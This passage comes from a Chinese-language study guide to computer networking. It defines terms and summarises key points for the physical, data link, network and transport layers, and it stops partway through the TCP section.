：学校或企业大多拥有多个互连的局域网。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KrcbeiaicrHWViab1Y1CpIL7HCRPkDU9krlC4LLNE7ZFd1OichDpTHpAWdg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="WMAN | Red de área metropolitana, Redes informaticas, Par trenzado">MAN &amp; </p><p><a href="http://conexionesmanwman.blogspot.com/">http://conexionesmanwman.blogspot.com/</a></p><ol><li><strong>个人区域网 PAN（Personal Area Network）</strong> ：在个人工作的地方把属于个人使用的电子设备用无线技术连接起来的网络 。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40K17hIicYcjUMEWOXggkLW94Jyj7iayq3yEXnQJ42JYD0sawosic7Olz8vA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="Advantages and disadvantages of personal area network (PAN) - IT Release"></p><p><a href="https://www.itrelease.com/2018/07/advantages-and-disadvantages-of-personal-area-network-pan/">https://www.itrelease.com/2018/07/advantages-and-disadvantages-of-personal-area-network-pan/</a></p><ol><li><strong>分组（packet ）</strong> ：因特网中传送的数据单元。由首部 header 和数据段组成。分组又称为包，首部可称为包头。</li><li><strong>存储转发（store and forward ）</strong> ：路由器收到一个分组，先检查分组是否正确，并过滤掉冲突包错误。确定包正确后，取出目的地址，通过查找表找到想要发送的输出端口地址，然后将该包发送出去。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KAGYPOOZYnccAPtoIe5wwSaTP9vlaJxgyLyISqBtjzkoLMWtB7miabrQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><ol><li><strong>带宽（bandwidth）</strong> ：在计算机网络中，表示在单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。常用来表示网络的通信线路所能传送数据的能力。单位是“比特每秒”，记为 b/s。</li><li><strong>吞吐量（throughput ）</strong> ：表示在单位时间内通过某个网络（或信道、接口）的数据量。吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。吞吐量受网络的带宽或网络的额定速率的限制。</li></ol><h3 id="1-2-重要知识点总结"><a href="#1-2-重要知识点总结" class="headerlink" title="1.2. 重要知识点总结"></a>1.2. 重要知识点总结</h3><ol><li><strong>计算机网络（简称网络）把许多计算机连接在一起，而互联网把许多网络连接在一起，是网络的网络。</strong></li><li>小写字母 i 开头的 internet（互联网）是通用名词，它泛指由多个计算机网络相互连接而成的网络。在这些网络之间的通信协议（即通信规则）可以是任意的。大写字母 I 开头的 Internet（互联网）是专用名词，它指全球最大的，开放的，由众多网络相互连接而成的特定的互联网，并采用 TCP/IP 协议作为通信规则，其前身为 ARPANET。Internet 的推荐译名为因特网，现在一般流行称为互联网。</li><li>路由器是实现分组交换的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。分组交换采用存储转发技术，表示把一个报文（要发送的整块数据）分为几个分组后再进行传送。在发送报文之前，先把较长的报文划分成为一个个更小的等长数据段。在每个数据端的前面加上一些由必要的控制信息组成的首部后，就构成了一个分组。分组又称为包。分组是在互联网中传送的数据单元，正是由于分组的头部包含了诸如目的地址和源地址等重要控制信息，每一个分组才能在互联网中独立的选择传输路径，并正确地交付到分组传输的终点。</li><li>互联网按工作方式可划分为边缘部分和核心部分。主机在网络的边缘部分，其作用是进行信息处理。由大量网络和连接这些网络的路由器组成核心部分，其作用是提供连通性和交换。</li><li>计算机通信是计算机中进程（即运行着的程序）之间的通信。计算机网络采用的通信方式是客户-服务器方式（C/S 方式）和对等连接方式（P2P 方式）。</li><li>客户和服务器都是指通信中所涉及的应用进程。客户是服务请求方，服务器是服务提供方。</li><li>按照作用范围的不同，计算机网络分为广域网 WAN，城域网 MAN，局域网 LAN，个人区域网 PAN。</li><li><strong>计算机网络最常用的性能指标是：速率，带宽，吞吐量，时延（发送时延，处理时延，排队时延），时延带宽积，往返时间和信道利用率。</strong></li><li>网络协议即协议，是为进行网络中的数据交换而建立的规则。计算机网络的各层以及其协议集合，称为网络的体系结构。</li><li><strong>五层体系结构由应用层，运输层，网络层（网际层），数据链路层，物理层组成。运输层最主要的协议是 TCP 和 UDP 协议，网络层最重要的协议是 IP 协议。</strong></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Kfsz72GZ1EcdaK10TEDmLicfWKA44icf6qaHtiaHfbPw2FQnaj8Ia9TMaw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>下面的内容会介绍计算机网络的五层体系结构：<strong>物理层+数据链路层+网络层（网际层）+运输层+应用层</strong>。</p><h2 id="2-物理层（Physical-Layer）"><a href="#2-物理层（Physical-Layer）" class="headerlink" title="2. 物理层（Physical Layer）"></a>2. 物理层（Physical Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KNaLqxZxFpZ39VMbFIhIco1KNmP32LgXonpxmyaCIiaicNqibF2pwqovRg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="物理层"></p><h3 id="2-1-基本术语"><a href="#2-1-基本术语" class="headerlink" title="2.1. 基本术语"></a>2.1. 基本术语</h3><ol><li><strong>数据（data）</strong> :运送消息的实体。</li><li><strong>信号（signal）</strong> ：数据的电气的或电磁的表现。或者说信号是适合在传输介质上传输的对象。</li><li><strong>码元（ code）</strong> ：在使用时间域（或简称为时域）的波形来表示数字信号时，代表不同离散数值的基本波形。</li><li><strong>单工（simplex ）</strong> : 只能有一个方向的通信而没有反方向的交互。</li><li><strong>半双工（half duplex ）</strong> ：通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</li><li><strong>全双工（full duplex）</strong> : 通信的双方可以同时发送和接收信息。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Kic4S5U3DHOIqEJZPHpstnia2tKS0WEeLiaGJKfaJnbicicXDtvVoBianfAYQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><ol><li><strong>失真</strong>：失去真实性，主要是指接受到的信号和发送的信号不同，有磨损和衰减。影响失真程度的因素：1.码元传输速率 2.信号传输距离 3.噪声干扰 4.传输媒体质量</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KohbQkoq2McFba8v1vVys8JHhycQvNqDBn9T2kksRcIwqibtwGlK41dQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><ol><li><strong>奈氏准则</strong> : 在任何信道中，码元的传输的效率是有上限的，传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的判决（即识别）成为不可能。</li><li><strong>香农定理</strong> ：在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。</li><li><strong>基带信号（baseband signal）</strong> : 来自信源的信号。指没有经过调制的数字信号或模拟信号。</li><li><strong>带通（频带）信号（bandpass signal）</strong> ：把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道），这里调制过后的信号就是带通信号。</li><li><strong>调制（modulation ）</strong> : 对信号源的信息进行处理后加到载波信号上，使其变为适合在信道传输的形式的过程。</li><li><strong>信噪比（signal-to-noise ratio ）</strong> : 指信号的平均功率和噪声的平均功率之比，记为 S/N。信噪比（dB）=10*log10（S/N）。</li><li><strong>信道复用（channel multiplexing ）</strong> ：指多个用户共享同一个信道。（并不一定是同时）。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KbnVTuNkLQX0B1mYiamxa2pA4WL5mxiakq2oBsXYzXjac0kofNmg44L3A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="信道复用技术"></p><ol><li><strong>比特率（bit rate ）</strong> ：单位时间（每秒）内传送的比特数。</li><li><strong>波特率（baud rate）</strong> ：单位时间载波调制状态改变的次数。针对数据信号对载波的调制速率。</li><li><strong>复用（multiplexing）</strong> ：共享信道的方法。</li><li><strong>ADSL（Asymmetric Digital Subscriber Line ）</strong> ：非对称数字用户线。</li><li><strong>光纤同轴混合网（HFC 网）</strong> :在目前覆盖范围很广的有线电视网的基础上开发的一种居民宽带接入网</li></ol><h3 id="2-2-重要知识点总结"><a href="#2-2-重要知识点总结" class="headerlink" title="2.2. 重要知识点总结"></a>2.2. 重要知识点总结</h3><ol><li><strong>物理层的主要任务就是确定与传输媒体接口有关的一些特性，如机械特性，电气特性，功能特性，过程特性。</strong></li><li>一个数据通信系统可划分为三大部分，即源系统，传输系统，目的系统。源系统包括源点（或源站，信源）和发送器，目的系统包括接收器和终点。</li><li><strong>通信的目的是传送消息。如话音，文字，图像等都是消息，数据是运送消息的实体。信号则是数据的电器或电磁的表现。</strong></li><li>根据信号中代表消息的参数的取值方式不同，信号可分为模拟信号（或连续信号）和数字信号（或离散信号）。在使用时间域（简称时域）的波形表示数字信号时，代表不同离散数值的基本波形称为码元。</li><li>根据双方信息交互的方式，通信可划分为单向通信（或单工通信），双向交替通信（或半双工通信），双向同时通信（全双工通信）。</li><li>来自信源的信号称为基带信号。信号要在信道上传输就要经过调制。调制有基带调制和带通调制之分。最基本的带通调制方法有调幅，调频和调相。还有更复杂的调制方法，如正交振幅调制。</li><li>要提高数据在信道上的传递速率，可以使用更好的传输媒体，或使用先进的调制技术。但数据传输速率不可能任意被提高。</li><li>传输媒体可分为两大类，即导引型传输媒体（双绞线，同轴电缆，光纤）和非导引型传输媒体（无线，红外，大气激光）。</li><li>了有效利用光纤资源，在光纤干线和用户之间广泛使用无源光网络 PON。无源光网络无需配备电源，其长期运营成本和管理成本都很低。最流行的无源光网络是以太网无源光网络 EPON 和吉比特无源光网络 GPON。</li></ol><h3 id="2-3-补充"><a href="#2-3-补充" class="headerlink" title="2.3. 补充"></a>2.3. 补充</h3><h4 id="2-3-1-物理层主要做啥？"><a href="#2-3-1-物理层主要做啥？" class="headerlink" title="2.3.1. 物理层主要做啥？"></a>2.3.1. 物理层主要做啥？</h4><p>物理层主要做的事情就是 <strong>透明地传送比特流</strong>。也可以将物理层的主要任务描述为确定与传输媒体的接口的一些特性，即：机械特性（接口所用接线器的一些物理属性如形状尺寸），电气特性（接口电缆的各条线上出现的电压的范围），功能特性（某条线上出现的某一电平的电压的意义），过程特性（对于不同功能能的各种可能事件的出现顺序）。</p><p><strong>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</strong> 现有的计算机网络中的硬件设备和传输媒体的种类非常繁多，而且通信手段也有许多不同的方式。物理层的作用正是尽可能地屏蔽掉这些传输媒体和通信手段的差异，使物理层上面的数据链路层感觉不到这些差异，这样就可以使数据链路层只考虑完成本层的协议和服务，而不必考虑网络的具体传输媒体和通信手段是什么。</p><h4 id="2-3-2-几种常用的信道复用技术"><a href="#2-3-2-几种常用的信道复用技术" class="headerlink" title="2.3.2. 几种常用的信道复用技术"></a>2.3.2. 几种常用的信道复用技术</h4><ol><li><strong>频分复用(FDM)</strong> ：所有用户在同样的时间占用不同的带宽资源。</li><li><strong>时分复用（TDM）</strong> ：所有用户在不同的时间占用同样的频带宽度（分时不分频）。</li><li><strong>统计时分复用 (Statistic TDM)</strong> ：改进的时分复用，能够明显提高信道的利用率。</li><li><strong>码分复用(CDM)</strong> ：用户使用经过特殊挑选的不同码型，因此各用户之间不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li><li><strong>波分复用( WDM)</strong> ：波分复用就是光的频分复用。</li></ol><h4 id="2-3-3-几种常用的宽带接入技术，主要是-ADSL-和-FTTx"><a href="#2-3-3-几种常用的宽带接入技术，主要是-ADSL-和-FTTx" class="headerlink" title="2.3.3. 几种常用的宽带接入技术，主要是 ADSL 和 FTTx"></a>2.3.3. 几种常用的宽带接入技术，主要是 ADSL 和 FTTx</h4><p>用户到互联网的宽带接入方法有非对称数字用户线 ADSL（用数字技术对现有的模拟电话线进行改造，而不需要重新布线。ASDL 的快速版本是甚高速数字用户线 VDSL。），光纤同轴混合网 HFC（是在目前覆盖范围很广的有线电视网的基础上开发的一种居民宽带接入网）和 FTTx（即光纤到······）。</p><h2 id="3-数据链路层（Data-Link-Layer）"><a href="#3-数据链路层（Data-Link-Layer）" class="headerlink" title="3. 数据链路层（Data Link Layer）"></a>3. 数据链路层（Data Link Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KyfdFTVYKazEFHWlq5TjQ1nrXKNibicB8Rnl0CWpxjwdZMy7NQ3BicA5Uw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="数据链路层"></p><h3 id="3-1-基本术语"><a href="#3-1-基本术语" class="headerlink" title="3.1. 基本术语"></a>3.1. 基本术语</h3><ol><li><p><strong>链路（link）</strong> ：一个结点到相邻结点的一段物理链路。</p></li><li><p><strong>数据链路（data link）</strong> ：把实现控制数据运输的协议的硬件和软件加到链路上就构成了数据链路。</p></li><li><p><strong>循环冗余检验 CRC（Cyclic Redundancy Check）</strong> ：为了保证数据传输的可靠性，CRC 是数据链路层广泛使用的一种检错技术。</p></li><li><p><strong>帧（frame）</strong> ：一个数据链路层的传输单元，由一个数据链路层首部和其携带的封包所组成协议数据单元。</p></li><li><p><strong>MTU（Maximum Transfer Uint ）</strong> ：最大传送单元。帧的数据部分的的长度上限。</p></li><li><p><strong>误码率 BER（Bit Error Rate ）</strong> ：在一段时间内，传输错误的比特占所传输比特总数的比率。</p></li><li><p><strong>PPP（Point-to-Point Protocol ）</strong> ：点对点协议。即用户计算机和 ISP 进行通信时所使用的数据链路层协议。以下是 PPP 帧的示意图：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KcgHcrb0eBKhQpqeYh333QnQWqv9iaicmsibRoWNmZJjXLmaQamIpUicymw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p></li><li><p><strong>MAC 地址（Media Access Control 或者 Medium Access Control）</strong> ：意译为媒体访问控制，或称为物理地址、硬件地址，用来定义网络设备的位置。在 OSI 模型中，第三层网络层负责 IP 地址，第二层数据链路层则负责 MAC 地址。因此一个主机会有一个 MAC 地址，而每个网络位置会有一个专属于它的 IP 地址 。地址是识别某个系统的重要标识符，“名字指出我们所要寻找的资源，地址指出资源所在的地方，路由告诉我们如何到达该处。</p></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KbbMOaYPic0dt4kjLMVrZicwRGkAlcQZvH84PdvKAeBecXh0u0dkzAhibA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="ARP (Address Resolution Protocol) explained"></p><ol><li><strong>网桥（bridge）</strong> ：一种用于数据链路层实现中继，连接两个或多个局域网的网络互连设备。</li><li><strong>交换机（switch ）</strong> ：广义的来说，交换机指的是一种通信系统中完成信息交换的设备。这里工作在数据链路层的交换机指的是交换式集线器，其实质是一个多接口的网桥</li></ol><h3 id="3-2-重要知识点总结"><a href="#3-2-重要知识点总结" class="headerlink" title="3.2. 重要知识点总结"></a>3.2. 重要知识点总结</h3><ol><li>链路是从一个结点到相邻节点的一段物理链路，数据链路则在链路的基础上增加了一些必要的硬件（如网络适配器）和软件（如协议的实现）</li><li>数据链路层使用的主要是<strong>点对点信道</strong>和<strong>广播信道</strong>两种。</li><li>数据链路层传输的协议数据单元是帧。数据链路层的三个基本问题是：<strong>封装成帧</strong>，<strong>透明传输</strong>和<strong>差错检测</strong></li><li><strong>循环冗余检验 CRC</strong> 是一种检错方法，而帧检验序列 FCS 是添加在数据后面的冗余码</li><li><strong>点对点协议 PPP</strong> 是数据链路层使用最多的一种协议，它的特点是：简单，只检测差错而不去纠正差错，不使用序号，也不进行流量控制，可同时支持多种网络层协议</li><li>PPPoE 是为宽带上网的主机使用的链路层协议</li><li><strong>局域网的优点是：具有广播功能，从一个站点可方便地访问全网；便于系统的扩展和逐渐演变；提高了系统的可靠性，可用性和生存性。</strong></li><li>计算机与外接局域网通信需要通过通信适配器（或网络适配器），它又称为网络接口卡或网卡。<strong>计算器的硬件地址就在适配器的 ROM 中</strong>。</li><li>以太网采用的无连接的工作方式，对发送的数据帧不进行编号，也不要求对方发回确认。目的站收到有差错帧就把它丢掉，其他什么也不做</li><li>以太网采用的协议是具有冲突检测的<strong>载波监听多点接入 CSMA/CD</strong>。协议的特点是：<strong>发送前先监听，边发送边监听，一旦发现总线上出现了碰撞，就立即停止发送。然后按照退避算法等待一段随机时间后再次发送。</strong> 因此，每一个站点在自己发送数据之后的一小段时间内，存在这遭遇碰撞的可能性。以太网上的各站点平等的争用以太网信道</li><li>以太网的适配器具有过滤功能，它只接收单播帧，广播帧和多播帧。</li><li>使用集线器可以在物理层扩展以太网（扩展后的以太网仍然是一个网络）</li></ol><h3 id="3-3-补充"><a href="#3-3-补充" class="headerlink" title="3.3. 补充"></a>3.3. 补充</h3><ol><li>数据链路层的点对点信道和广播信道的特点，以及这两种信道所使用的协议（PPP 协议以及 CSMA/CD 协议）的特点</li><li>数据链路层的三个基本问题：<strong>封装成帧</strong>，<strong>透明传输</strong>，<strong>差错检测</strong></li><li>以太网的 MAC 层硬件地址</li><li>适配器，转发器，集线器，网桥，以太网交换机的作用以及适用场合</li></ol><h2 id="4-网络层（Network-Layer）"><a href="#4-网络层（Network-Layer）" class="headerlink" title="4. 网络层（Network Layer）"></a>4. 网络层（Network Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KheCDa24wZ5XBmYdgegDSbnHUib2cFcYr6CEYVyzzMNLJFYzttzFCzIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="网络层"></p><h3 id="4-1-基本术语"><a href="#4-1-基本术语" class="headerlink" title="4.1. 基本术语"></a>4.1. 基本术语</h3><ol><li><strong>虚电路（Virtual Circuit）</strong> : 在两个终端设备的逻辑或物理端口之间，通过建立的双向的透明传输通道。虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。</li><li><strong>IP（Internet Protocol ）</strong> : 网际协议 IP 是 TCP/IP 体系中两个最主要的协议之一，是 TCP/IP 体系结构网际层的核心。配套的有 ARP，RARP，ICMP，IGMP。</li><li><strong>ARP（Address Resolution Protocol）</strong> : 地址解析协议。地址解析协议 ARP 把 IP 地址解析为硬件地址。</li><li><strong>ICMP（Internet Control Message Protocol ）</strong> ：网际控制报文协议 （ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告）。</li><li><strong>子网掩码（subnet mask ）</strong> ：它是一种用来指明一个 IP 地址的哪些位标识的是主机所在的子网以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合 IP 地址一起使用。</li><li>**CIDR（ Classless Inter-Domain Routing ） **：无分类域间路由选择 （特点是消除了传统的 A 类、B 类和 C 类地址以及划分子网的概念，并使用各种长度的“网络前缀”(network-prefix)来代替分类地址中的网络号和子网号）。</li><li><strong>默认路由（default route）</strong> ：当在路由表中查不到能到达目的地址的路由时，路由器选择的路由。默认路由还可以减小路由表所占用的空间和搜索路由表所用的时间。</li><li><strong>路由选择算法（Virtual Circuit）</strong> ：路由选择协议的核心部分。因特网采用自适应的，分层次的路由选择协议。</li></ol><h3 id="4-2-重要知识点总结"><a href="#4-2-重要知识点总结" class="headerlink" title="4.2. 重要知识点总结"></a>4.2. 重要知识点总结</h3><ol><li><strong>TCP/IP 协议中的网络层向上只提供简单灵活的，无连接的，尽最大努力交付的数据报服务。网络层不提供服务质量的承诺，不保证分组交付的时限所传送的分组可能出错，丢失，重复和失序。进程之间通信的可靠性由运输层负责</strong></li><li>在互联网的交付有两种，一是在本网络直接交付不用经过路由器，另一种是和其他网络的间接交付，至少经过一个路由器，但最后一次一定是直接交付</li><li>分类的 IP 地址由网络号字段（指明网络）和主机号字段（指明主机）组成。网络号字段最前面的类别指明 IP 地址的类别。IP 地址是一种分等级的地址结构。IP 地址管理机构分配 IP 地址时只分配网络号，主机号由得到该网络号的单位自行分配。路由器根据目的主机所连接的网络号来转发分组。一个路由器至少连接到两个网络，所以一个路由器至少应当有两个不同的 IP 地址</li><li>IP 数据报分为首部和数据两部分。首部的前一部分是固定长度，共 20 字节，是所有 IP 数据包必须具有的（源地址，目的地址，总长度等重要地段都固定在首部）。一些长度可变的可选字段固定在首部的后面。IP 首部中的生存时间给出了 IP 数据报在互联网中所能经过的最大路由器数。可防止 IP 数据报在互联网中无限制的兜圈子。</li><li><strong>地址解析协议 ARP 把 IP 地址解析为硬件地址。ARP 的高速缓存可以大大减少网络上的通信量。因为这样可以使主机下次再与同样地址的主机通信时，可以直接从高速缓存中找到所需要的硬件地址而不需要再去广播方式发送 ARP 请求分组</strong></li><li>无分类域间路由选择 CIDR 是解决目前 IP 地址紧缺的一个好办法。CIDR 记法把 IP 地址后面加上斜线“/”，然后写上前缀所所占的位数。前缀（或网络前缀用来指明网络），前缀后面的部分是后缀，用来指明主机。CIDR 把前缀都相同的连续的 IP 地址组成一个“CIDR 地址块”，IP 地址分配都以 CIDR 地址块为单位。</li><li>网际控制报文协议是 IP 层的协议。ICMP 报文作为 IP 数据报的数据，加上首部后组成 IP 数据报发送出去。使用 ICMP 数据报并不是为了实现可靠传输。ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。ICMP 报文的种类有两种 ICMP 差错报告报文和 ICMP 询问报文。</li><li><strong>要解决 IP 地址耗尽的问题，最根本的办法是采用具有更大地址空间的新版本 IP 协议-IPv6。</strong> IPv6 所带来的变化有 ① 更大的地址空间（采用 128 位地址）② 灵活的首部格式 ③ 改进的选项 ④ 支持即插即用 ⑤ 支持资源的预分配 ⑥IPv6 的首部改为 8 字节对齐。</li><li><strong>虚拟专用网络 VPN 利用公用的互联网作为本机构专用网之间的通信载体。VPN 内使用互联网的专用地址。一个 VPN 至少要有一个路由器具有合法的全球 IP 地址，这样才能和本系统的另一个 VPN 通过互联网进行通信。所有通过互联网传送的数据都需要加密。</strong></li><li>MPLS 的特点是：① 支持面向连接的服务质量 ② 支持流量工程，平衡网络负载 ③ 有效的支持虚拟专用网 VPN。MPLS 在入口节点给每一个 IP 数据报打上固定长度的“标记”，然后根据标记在第二层（链路层）用硬件进行转发（在标记交换路由器中进行标记交换），因而转发速率大大加快。</li></ol><h2 id="5-传输层（Transport-Layer）"><a href="#5-传输层（Transport-Layer）" class="headerlink" title="5. 传输层（Transport Layer）"></a>5. 传输层（Transport Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KoHBD0X9EMw9t3oPz1tDEHiaSqibTibJNfOicXfEZiaib61WSMLuP4smoiaB6g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="传输层"></p><h3 id="5-1-基本术语"><a href="#5-1-基本术语" class="headerlink" title="5.1. 基本术语"></a>5.1. 基本术语</h3><ol><li><strong>进程（process）</strong> ：指计算机中正在运行的程序实体。</li><li><strong>应用进程互相通信</strong> ：一台主机的进程和另一台主机中的一个进程交换数据的过程（另外注意通信真正的端点不是主机而是主机中的进程，也就是说端到端的通信是应用进程之间的通信）。</li><li><strong>传输层的复用与分用</strong> ：复用指发送方不同的进程都可以通过统一个运输层协议传送数据。分用指接收方的运输层在剥去报文的首部后能把这些数据正确的交付到目的应用进程。</li><li><strong>TCP（Transmission Control Protocol）</strong> ：传输控制协议。</li><li><strong>UDP（User Datagram Protocol）</strong> ：用户数据报协议。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40K5WSJtMImibp4CUwlNA0rsoSUrYe0DsBwWic3FiaYKjO9meXcB2tT0qiblQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="TCP和UDP"></p><ol><li>**端口（port） ** ：端口的目的是为了确认对方机器是那个进程在于自己进行交互，比如 MSN 和 QQ 的端口不同，如果没有端口就可能出现 QQ 进程和 MSN 交互错误。端口又称协议端口号。</li><li><strong>停止等待协议（stop-and-wait）</strong> ：指发送方每发送完一个分组就停止发送，等待对方确认，在收到确认之后在发送下一个分组。</li><li><strong>流量控制</strong> : 就是让发送方的发送速率不要太快，既要让接收方来得及接收，也不要使网络发生拥塞。</li><li><strong>拥塞控制</strong> ：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。</li></ol><h3 id="5-2-重要知识点总结"><a href="#5-2-重要知识点总结" class="headerlink" title="5.2. 重要知识点总结"></a>5.2. 重要知识点总结</h3><ol><li><strong>运输层提供应用进程之间的逻辑通信，也就是说，运输层之间的通信并不是真正在两个运输层之间直接传输数据。运输层向应用层屏蔽了下面网络的细节（如网络拓补，所采用的路由选择协议等），它使应用进程之间看起来好像两个运输层实体之间有一条端到端的逻辑通信信道。</strong></li><li><strong>网络层为主机提供逻辑通信，而运输层为应用进程之间提供端到端的逻辑通信。</strong></li><li>运输层的两个重要协议是用户数据报协议 UDP 和传输控制协议 TCP。按照 OSI 的术语，两个对等运输实体在通信时传送的数据单位叫做运输协议数据单元 TPDU（Transport Protocol Data Unit）。但在 TCP/IP 体系中，则根据所使用的协议是 TCP 或 UDP，分别称之为 TCP 报文段或 UDP 用户数据报。</li><li><strong>UDP 在传送数据之前不需要先建立连接，远地主机在收到 UDP 报文后，不需要给出任何确认。虽然 UDP 不提供可靠交付，但在某些情况下 UDP 确是一种最有效的工作方式。TCP 提供面向连接的服务。在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP 不提供广播或多播服务。由于 TCP 要提供可靠的，面向连接的传输服务，这一难以避免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。</strong></li><li>硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层各种协议进程与运输实体进行层间交互的一种地址。UDP 和 TCP 的首部格式中都有源端口和目的端口这两个重要字段。当运输层收到 IP 层交上来的运输层报文时，就能够 根据其首部中的目的端口号把数据交付应用层的目的应用层。（两个进程之间进行通信不光要知道对方 IP 地址而且要知道对方的端口号(为了找到对方计算机中的应用进程)）</li><li>运输层用一个 16 位端口号标志一个端口。端口号只有本地意义，它只是为了标志计算机应用层中的各个进程在和运输层交互时的层间接口。在互联网的不同计算机中，相同的端口号是没有关联的。协议端口号简称端口。虽然通信的终点是应用进程，但只要把所发送的报文交到目的主机的某个合适端口，剩下的工作（最后交付目的进程）就由 TCP 和 UDP 来完成。</li><li>运输层的端口号分为服务器端使用的端口号（0<del>1023 指派给熟知端口，1024</del>49151 是登记端口号）和客户端暂时使用的端口号（49152~65535）</li><li><strong>UDP 的主要特点是 ① 无连接 ② 尽最大努力交付 ③ 面向报文 ④ 无拥塞控制 ⑤ 支持一对一，一对多，多对一和多对多的交互通信 ⑥ 首部开销小（只有四个字段：源端口，目的端口，长度和检验和）</strong></li><li><strong>TCP 的主要特点是 ① 面向连接 ② 每一条 TCP 连接只能是一对一的 ③ 提供可靠交付 ④ 提供全双工通信 ⑤ 面向字节流</strong></li><li><strong>TCP 用主机的 IP 地址加上主机上的端口号作为 TCP 连接的端点。这样的端点就叫做套接字（socket）或插口。套接字用（IP 地址：端口号）来表示。每一条 TCP 连接唯一被通信两端的两个端点所确定。</strong></li><li>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</li><li>为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用流水线传输。流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停下来等待对方确认。这样可使信道上一直有数据不间断的在传送。这种传输方式可以明显提高信道利用率。</li><li>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求 ARQ。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</li><li>TCP 报文段的前 20 个字节是固定的，后面有 4n 字节是根据需要增加的选项。因此，TCP 首部的最小长度是 20 字节。</li><li><strong>TCP 